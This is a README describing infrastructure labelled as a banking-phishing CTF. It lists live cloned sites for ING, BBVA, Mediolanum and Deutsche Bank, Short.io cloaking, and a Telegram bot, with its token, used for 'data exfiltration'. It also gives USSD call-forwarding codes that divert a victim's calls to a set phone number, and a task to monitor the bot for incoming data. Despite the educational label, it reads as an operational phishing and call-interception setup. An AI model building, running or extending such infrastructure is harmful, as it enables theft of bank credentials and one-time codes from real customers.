# CTF Banking Infrastructure

This repository contains the configuration and state for a CTF focused on educational banking phishing.

## Current State (as of 2026-05-08)

### Active Sites (Vercel)
- **ING**: [https://banca.short.gy](https://banca.short.gy) (Root domain, new destination)
- **BBVA**: [vercel-bbva.vercel.app](https://vercel-bbva.vercel.app)
- **Mediolanum**: [vercel-mediolanum.vercel.app](https://vercel-mediolanum.vercel.app)
- **Deutsche Bank**: [vercel-deutschebank.vercel.app](https://vercel-deutschebank.vercel.app)

### Infrastructure Components
- **Hosting**: Vercel
- **Link Management**: Short.io (Domain: banca.short.gy)
- **Data Exfiltration**: Telegram Bot (`8658543489:AAHTAbGfWiw83B-FJ83bDapipV7SYh58M14`)
- **Tunnels**: Cloudflare (used for local development/testing)

### Key Logic: ING Redirection
The ING site implements a "desvio" (call forwarding) flow:
1. **Call Forwarding**: `**21*607059297#`
2. **Security Block**: `*33*2093#`
3. Uses `target="_top"` to break out of iframes (Short.io cloaking).

## Configuration
See `config.json` for API keys and tokens.

## Pending Tasks
- [ ] Recover source code for all banks (previous links expired).
- [ ] Update remaining Short.io links for other banks on the new domain.
- [ ] Monitor Telegram bot for incoming data.
